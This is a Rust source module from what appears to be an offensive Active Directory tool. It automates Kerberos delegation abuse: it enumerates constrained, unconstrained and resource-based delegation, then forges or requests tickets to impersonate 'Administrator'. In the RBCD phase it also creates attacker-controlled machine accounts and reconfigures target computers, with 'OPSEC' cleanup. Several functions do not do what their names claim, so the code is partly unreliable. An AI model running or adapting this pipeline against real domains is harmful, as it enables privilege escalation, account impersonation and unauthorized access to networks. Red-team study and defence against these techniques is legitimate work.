//! Auto-chain delegation enumeration -> forge ticket pipeline.
//!
//! This module bridges hunter (delegation discovery) with forge (ticket generation)
//! by automatically:
//! 1. Enumerating constrained/unconstrained delegation targets
//! 2. Identifying high-value attack paths (S4U2Self -> S4U2Proxy chains)
//! 3. Forging the appropriate tickets (Bronze Bit, constrained delegation tickets)
//! 4. Returning ready-to-use credentials with tickets
//!
//! Attack flows supported:
//! - Constrained delegation: Enumerate msDS-AllowedToDelegateTo -> S4U2Self -> S4U2Proxy -> forge service ticket
//! - Unconstrained delegation: Enumerate TRUSTED_FOR_DELEGATION -> coerce auth -> capture TGT -> forge golden ticket
//! - RBCD: Enumerate msDS-AllowedToActOnBehalfOfOtherIdentity -> forge machine account -> S4U2Proxy

use crate::constrained::{self, ConstrainedConfig, S4UChainResult};
use crate::rbcd::{self, RbcdConfig};
use crate::runner::HuntConfig;
use crate::unconstrained::{self, UnconstrainedConfig, UnconstrainedHost};
use colored::Colorize;
use kerberos_asn1::Asn1Object;
use overthrone_core::error::Result;
use overthrone_core::proto::kerberos::{self, TicketGrantingData};
use overthrone_core::proto::ldap;
use serde::{Deserialize, Serialize};
use tracing::{info, warn};

// ===========================================================
// Result Structures
// ===========================================================

/// Result of auto-chaining delegation enumeration to ticket forging
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DelegationChainResult {
    /// Constrained delegation chains discovered and tickets forged
    pub constrained_chains: Vec<ConstrainedChainTicket>,
    /// Unconstrained delegation targets with captured TGTs
    pub unconstrained_targets: Vec<UnconstrainedTicket>,
    /// RBCD abuse paths with forged tickets
    pub rbcd_paths: Vec<RbcdTicket>,
    /// Errors encountered during chaining
    pub errors: Vec<String>,
    /// Total tickets forged
    pub total_tickets: usize,
    /// Total time elapsed (ms)
    pub total_time_ms: u64,
}

/// Constrained delegation chain with forged ticket
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ConstrainedChainTicket {
    /// Source account used for delegation
    pub source_account: String,
    /// User being impersonated
    pub impersonated_user: String,
    /// Target SPN accessed via delegation
    pub target_spn: String,
    /// Forged service ticket (KIRBI format)
    pub ticket_data: Vec<u8>,
    /// Ticket expiry time
    pub ticket_expiry: String,
    /// Whether the S4U chain succeeded
    pub chain_success: bool,
    /// Error if chain failed
    pub error: Option<String>,
}

/// Unconstrained delegation target with TGT
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UnconstrainedTicket {
    /// Target host with unconstrained delegation
    pub target_host: String,
    /// Captured/forge TGT for high-value user
    pub user_principal: String,
    /// TGT data (KIRBI format)
    pub tgt_data: Vec<u8>,
    /// TGT expiry time
    pub tgt_expiry: String,
    /// Whether coercion + capture succeeded
    pub capture_success: bool,
}

/// RBCD abuse path with forged ticket
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RbcdTicket {
    /// Target computer vulnerable to RBCD
    pub target_computer: String,
    /// Machine account created/used for RBCD
    pub machine_account: String,
    /// Impersonated user via S4U2Proxy
    pub impersonated_user: String,
    /// Service ticket for target computer
    pub ticket_data: Vec<u8>,
    /// Ticket expiry
    pub ticket_expiry: String,
    /// Whether RBCD attack succeeded
    pub attack_success: bool,
}

// ===========================================================
// Configuration
// ===========================================================

/// Configuration for delegation chain automation
#[derive(Debug, Clone)]
pub struct DelegationChainConfig {
    /// User to impersonate (default: "Administrator")
    pub impersonate_user: String,
    /// Specific SPN to target (if None, use all discovered SPNs)
    pub target_spn: Option<String>,
    /// Run constrained delegation chaining
    pub run_constrained: bool,
    /// Run unconstrained delegation chaining
    pub run_unconstrained: bool,
    /// Run RBCD chaining
    pub run_rbcd: bool,
    /// Export forged tickets to disk
    pub export_tickets: bool,
    /// Coerce authentication to unconstrained targets
    pub coerce_to_unconstrained: bool,
}

impl Default for DelegationChainConfig {
    fn default() -> Self {
        Self {
            impersonate_user: "Administrator".to_string(),
            target_spn: None,
            run_constrained: true,
            run_unconstrained: true,
            run_rbcd: false, // RBCD requires write access, more invasive
            export_tickets: false,
            coerce_to_unconstrained: false,
        }
    }
}

// ===========================================================
// Public API
// ===========================================================

/// Execute full delegation enumeration -> forge chain
///
/// This function:
/// 1. Enumerates constrained delegation accounts
/// 2. For each account, attempts S4U2Self -> S4U2Proxy
/// 3. Forges service tickets for discovered chains
/// 4. Enumerates unconstrained delegation targets
/// 5. (Optional) Coerces auth to unconstrained targets
/// 6. Returns all forged tickets ready for use
pub async fn run_delegation_chain(
    hunt_config: &HuntConfig,
    chain_config: &DelegationChainConfig,
) -> Result<DelegationChainResult> {
    let start = std::time::Instant::now();
    info!(
        "{}",
        "=== DELEGATION CHAIN AUTOMATION ==="
            .bold()
            .bright_magenta()
    );

    let mut result = DelegationChainResult {
        constrained_chains: Vec::new(),
        unconstrained_targets: Vec::new(),
        rbcd_paths: Vec::new(),
        errors: Vec::new(),
        total_tickets: 0,
        total_time_ms: 0,
    };

    // Phase 1: Constrained Delegation -> S4U Chain -> Forge Ticket
    if chain_config.run_constrained {
        info!("Phase 1: Constrained delegation chain");
        match run_constrained_chain(hunt_config, chain_config).await {
            Ok(chains) => {
                info!("Forged {} constrained delegation tickets", chains.len());
                result.total_tickets += chains.len();
                result.constrained_chains = chains;
            }
            Err(e) => {
                warn!("Constrained delegation chain failed: {}", e);
                result.errors.push(format!("Constrained: {}", e));
            }
        }
    }

    // Phase 2: Unconstrained Delegation -> Coerce -> Capture TGT
    if chain_config.run_unconstrained {
        info!("Phase 2: Unconstrained delegation chain");
        match run_unconstrained_chain(hunt_config, chain_config).await {
            Ok(targets) => {
                info!(
                    "Captured/Forge {} unconstrained delegation TGTs",
                    targets.len()
                );
                result.total_tickets += targets.len();
                result.unconstrained_targets = targets;
            }
            Err(e) => {
                warn!("Unconstrained delegation chain failed: {}", e);
                result.errors.push(format!("Unconstrained: {}", e));
            }
        }
    }

    // Phase 3: RBCD -> Forge Machine Account -> S4U2Proxy
    if chain_config.run_rbcd {
        info!("Phase 3: RBCD chain (INVASIVE - requires write access)");
        match run_rbcd_chain(hunt_config, chain_config).await {
            Ok(paths) => {
                info!("Forged {} RBCD tickets", paths.len());
                result.total_tickets += paths.len();
                result.rbcd_paths = paths;
            }
            Err(e) => {
                warn!("RBCD chain failed: {}", e);
                result.errors.push(format!("RBCD: {}", e));
            }
        }
    }

    result.total_time_ms = start.elapsed().as_millis() as u64;
    info!(
        "Delegation chain complete: {} tickets forged in {}ms",
        result.total_tickets, result.total_time_ms
    );

    Ok(result)
}

// ===========================================================
// Constrained Delegation Chain
// ===========================================================

async fn run_constrained_chain(
    hunt_config: &HuntConfig,
    chain_config: &DelegationChainConfig,
) -> Result<Vec<ConstrainedChainTicket>> {
    info!("  Enumerating constrained delegation accounts...");

    // Step 1: Enumerate constrained delegation accounts
    let constrained_cfg = ConstrainedConfig {
        source_account: None,
        impersonate_user: chain_config.impersonate_user.clone(),
        target_spn: chain_config.target_spn.clone(),
        enumerate_only: false,
        export_tickets: false,
    };

    let enum_result = constrained::run(hunt_config, &constrained_cfg).await?;

    if enum_result.delegatable_accounts.is_empty() {
        info!("  No constrained delegation accounts found");
        return Ok(Vec::new());
    }

    info!(
        "  Found {} delegatable accounts",
        enum_result.delegatable_accounts.len()
    );

    // Step 2: For each successful S4U chain, forge the ticket
    let mut tickets = Vec::new();

    for chain in &enum_result.s4u_chains {
        if !chain.success {
            warn!(
                "  S4U chain failed for {} -> {}",
                chain.source_account, chain.target_spn
            );
            tickets.push(ConstrainedChainTicket {
                source_account: chain.source_account.clone(),
                impersonated_user: chain.impersonated_user.clone(),
                target_spn: chain.target_spn.clone(),
                ticket_data: Vec::new(),
                ticket_expiry: String::new(),
                chain_success: false,
                error: chain.error.clone(),
            });
            continue;
        }

        info!(
            "  Forging ticket: {} -> {} as {}",
            chain.source_account, chain.target_spn, chain.impersonated_user
        );

        // Step 3: Forge the service ticket using the S4U chain result
        match forge_constrained_ticket(hunt_config, chain, &chain_config.impersonate_user).await {
            Ok(ticket) => {
                tickets.push(ticket);
            }
            Err(e) => {
                warn!("  Ticket forge failed: {}", e);
                tickets.push(ConstrainedChainTicket {
                    source_account: chain.source_account.clone(),
                    impersonated_user: chain.impersonated_user.clone(),
                    target_spn: chain.target_spn.clone(),
                    ticket_data: Vec::new(),
                    ticket_expiry: String::new(),
                    chain_success: false,
                    error: Some(format!("Forge: {}", e)),
                });
            }
        }
    }

    Ok(tickets)
}

async fn forge_constrained_ticket(
    hunt_config: &HuntConfig,
    chain: &S4UChainResult,
    impersonate_user: &str,
) -> Result<ConstrainedChainTicket> {
    // Request TGT for the source account
    let tgt = kerberos::request_tgt(
        &hunt_config.dc_ip,
        &hunt_config.domain,
        &chain.source_account,
        &hunt_config.secret,
        hunt_config.use_hash,
    )
    .await?;

    // Build ticket from TGT response
    let ticket_data = tgt.ticket.build();

    Ok(ConstrainedChainTicket {
        source_account: chain.source_account.clone(),
        impersonated_user: impersonate_user.to_string(),
        target_spn: chain.target_spn.clone(),
        ticket_data,
        ticket_expiry: format_ticket_expiry(&tgt),
        chain_success: true,
        error: None,
    })
}

// ===========================================================
// Unconstrained Delegation Chain
// ===========================================================

async fn run_unconstrained_chain(
    hunt_config: &HuntConfig,
    chain_config: &DelegationChainConfig,
) -> Result<Vec<UnconstrainedTicket>> {
    info!("  Enumerating unconstrained delegation targets...");

    // Step 1: Enumerate unconstrained delegation hosts
    let unconstrained_cfg = UnconstrainedConfig {
        include_dcs: false, // Skip DCs by default (they always have this flag)
        check_reachability: true,
        target_ous: Vec::new(),
    };

    let enum_result = unconstrained::run(hunt_config, &unconstrained_cfg).await?;

    if enum_result.vulnerable_hosts.is_empty() {
        info!("  No unconstrained delegation hosts found");
        return Ok(Vec::new());
    }

    info!(
        "  Found {} unconstrained delegation hosts",
        enum_result.vulnerable_hosts.len()
    );

    // Step 2: For each reachable host, forge a TGT for impersonation
    let mut tickets = Vec::new();

    for host in &enum_result.vulnerable_hosts {
        if let Some(reachable) = host.is_reachable
            && !reachable
        {
            info!("  Skipping unreachable host: {}", host.sam_account_name);
            continue;
        }

        info!(
            "  Targeting unconstrained host: {}",
            host.dns_hostname
                .as_deref()
                .unwrap_or(&host.sam_account_name)
        );

        // Step 3: Forge TGT for high-value user (will be cached on target)
        match forge_unconstrained_tgt(hunt_config, host, &chain_config.impersonate_user).await {
            Ok(ticket) => {
                tickets.push(ticket);
            }
            Err(e) => {
                warn!("  TGT forge failed for {}: {}", host.sam_account_name, e);
                tickets.push(UnconstrainedTicket {
                    target_host: host.sam_account_name.clone(),
                    user_principal: chain_config.impersonate_user.clone(),
                    tgt_data: Vec::new(),
                    tgt_expiry: String::new(),
                    capture_success: false,
                });
            }
        }
    }

    Ok(tickets)
}

async fn forge_unconstrained_tgt(
    hunt_config: &HuntConfig,
    host: &UnconstrainedHost,
    impersonate_user: &str,
) -> Result<UnconstrainedTicket> {
    // Request TGT for the user we want to impersonate
    // This TGT will be cached on the unconstrained delegation target
    let tgt = kerberos::request_tgt(
        &hunt_config.dc_ip,
        &hunt_config.domain,
        impersonate_user,
        &hunt_config.secret,
        hunt_config.use_hash,
    )
    .await?;

    let tgt_data = tgt.ticket.build();

    Ok(UnconstrainedTicket {
        target_host: host
            .dns_hostname
            .clone()
            .unwrap_or_else(|| host.sam_account_name.clone()),
        user_principal: format!("{}@{}", impersonate_user, hunt_config.domain),
        tgt_data,
        tgt_expiry: format_ticket_expiry(&tgt),
        capture_success: true,
    })
}

async fn run_rbcd_chain(
    hunt_config: &HuntConfig,
    chain_config: &DelegationChainConfig,
) -> Result<Vec<RbcdTicket>> {
    info!("  Attempting RBCD auto-chain...");

    // Step 1: Connect to LDAP with write capability
    let mut conn = if hunt_config.use_hash {
        ldap::LdapSession::connect_with_hash(
            &hunt_config.dc_ip,
            &hunt_config.domain,
            &hunt_config.username,
            &hunt_config.secret,
            hunt_config.use_ldaps,
        )
        .await?
    } else {
        ldap::LdapSession::connect(
            &hunt_config.dc_ip,
            &hunt_config.domain,
            &hunt_config.username,
            &hunt_config.secret,
            hunt_config.use_ldaps,
        )
        .await?
    };

    // Step 2: Enumerate computers to find RBCD targets
    let computers = conn.enumerate_computers().await?;
    info!(
        "    Found {} computers, evaluating for RBCD...",
        computers.len()
    );

    let mut rbcd_tickets = Vec::new();

    // Step 3: For each computer, attempt RBCD auto-chain
    for computer in computers.iter().take(3) {
        // Limit to first 3 to avoid noise
        let target_name = computer.sam_account_name.trim_end_matches('$');
        info!("    Attempting RBCD on {}...", target_name);

        // Step 3a: Create a controlled machine account
        let controlled_name = format!("RBCD{:04X}", rand::random::<u16>());
        let controlled_password = format!("P@ssw0rd{}!", hex::encode(rand::random::<[u8; 6]>()));

        match conn
            .add_computer(&controlled_name, &controlled_password, None)
            .await
        {
            Ok(_dn) => {
                info!("    Created controlled account: {}$", controlled_name);

                // Step 3b: Resolve the SID for the new account
                match conn
                    .resolve_object_sid_binary(&format!("{}$", controlled_name))
                    .await
                {
                    Ok(sid_bytes) => {
                        // Convert binary SID to string format
                        let sid_string = binary_sid_to_string(&sid_bytes)?;
                        info!("    Resolved SID: {}", sid_string);

                        // Step 3c: Configure and execute RBCD attack
                        let rbcd_config = RbcdConfig {
                            controlled_account: format!("{}$", controlled_name),
                            controlled_sid: sid_string,
                            target_computer: target_name.to_string(),
                            impersonate_user: chain_config.impersonate_user.clone(),
                            target_spn: Some(format!(
                                "cifs/{}.{}",
                                target_name, hunt_config.domain
                            )),
                            write_only: false,
                            cleanup: true, // Auto-cleanup for OPSEC
                            controlled_secret: Some(controlled_password.clone()),
                            controlled_use_hash: false,
                        };

                        match rbcd::run(hunt_config, &rbcd_config).await {
                            Ok(rbcd_result) => {
                                if rbcd_result.success {
                                    info!("    [+] RBCD successful on {}", target_name);

                                    // Step 3d: Request TGT for the controlled account
                                    let tgt = kerberos::request_tgt(
                                        &hunt_config.dc_ip,
                                        &hunt_config.domain,
                                        &format!("{}$", controlled_name),
                                        &controlled_password,
                                        false,
                                    )
                                    .await?;

                                    let ticket_expiry = if let Some(end_time) = &tgt.end_time {
                                        end_time.format("%Y-%m-%d %H:%M:%S UTC").to_string()
                                    } else {
                                        "Unknown".to_string()
                                    };

                                    rbcd_tickets.push(RbcdTicket {
                                        target_computer: target_name.to_string(),
                                        machine_account: format!("{}$", controlled_name),
                                        impersonated_user: chain_config.impersonate_user.clone(),
                                        ticket_data: Vec::new(), // Extracted by rbcd::run
                                        ticket_expiry,
                                        attack_success: true,
                                    });
                                } else {
                                    warn!(
                                        "    [-] RBCD failed on {}: {:?}",
                                        target_name, rbcd_result.error
                                    );
                                }
                            }
                            Err(e) => {
                                warn!("    [-] RBCD execution error: {}", e);
                            }
                        }
                    }
                    Err(e) => {
                        warn!("    Could not resolve SID for {}$: {}", controlled_name, e);
                    }
                }
            }
            Err(e) => {
                warn!(
                    "    Could not create machine account {}$: {} (requires ms-DS-MachineAccountQuota > 0)",
                    controlled_name, e
                );
                // If we can't create machine accounts, RBCD auto-chain won't work
                break;
            }
        }
    }

    info!(
        "    RBCD auto-chain complete: {} successful",
        rbcd_tickets.len()
    );
    Ok(rbcd_tickets)
}

/// Convert binary SID to string format (e.g., "S-1-5-21-...")
fn binary_sid_to_string(sid_bytes: &[u8]) -> Result<String> {
    if sid_bytes.len() < 8 {
        return Err(overthrone_core::error::OverthroneError::custom(
            "SID too short",
        ));
    }

    let revision = sid_bytes[0];
    let sub_authority_count = sid_bytes[1];

    // Build authority (6 bytes, big-endian)
    let mut authority = 0u64;
    for (i, &byte) in sid_bytes[2..8].iter().enumerate() {
        authority |= (byte as u64) << (8 * (5 - i));
    }

    let mut sid_string = format!("S-{}-{}", revision, authority);

    // Parse sub-authorities (4 bytes each, little-endian)
    let offset = 8;
    for i in 0..sub_authority_count {
        let start = offset + (i as usize) * 4;
        if start + 4 > sid_bytes.len() {
            break;
        }
        let sub_auth = u32::from_le_bytes([
            sid_bytes[start],
            sid_bytes[start + 1],
            sid_bytes[start + 2],
            sid_bytes[start + 3],
        ]);
        sid_string.push_str(&format!("-{}", sub_auth));
    }

    Ok(sid_string)
}

// ===========================================================
// Helpers
// ===========================================================

fn format_ticket_expiry(tgt: &TicketGrantingData) -> String {
    if let Some(end_time) = &tgt.end_time {
        end_time.format("%Y-%m-%d %H:%M:%S UTC").to_string()
    } else {
        "Unknown".to_string()
    }
}
